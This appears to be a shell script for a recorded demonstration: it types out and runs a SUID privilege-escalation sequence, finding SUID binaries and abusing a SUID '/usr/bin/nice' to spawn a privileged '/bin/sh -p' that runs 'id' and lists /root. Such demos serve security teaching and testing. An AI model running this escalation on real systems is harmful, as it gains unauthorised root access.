#!/bin/bash

echo -n "$ "
echo "find / -type f -perm -04000 -ls 2>/dev/null" | pv -qL 10
find / -type f -perm -04000 -ls 2>/dev/null
echo -n "$ "
echo "ls -l /usr/bin/nice" | pv -qL 10
ls -l /usr/bin/nice
echo -n "$ "
echo "/usr/bin/nice /bin/sh -p -c id" | pv -qL 10
/usr/bin/nice /bin/sh -p -c id
echo -n "$ "
echo "/usr/bin/nice /bin/sh -p -c \"ls -l /root\"" | pv -qL 10
/usr/bin/nice /bin/sh -p -c "ls -l /root"
echo -n "$ "
echo "exit" | pv -qL 10
exit
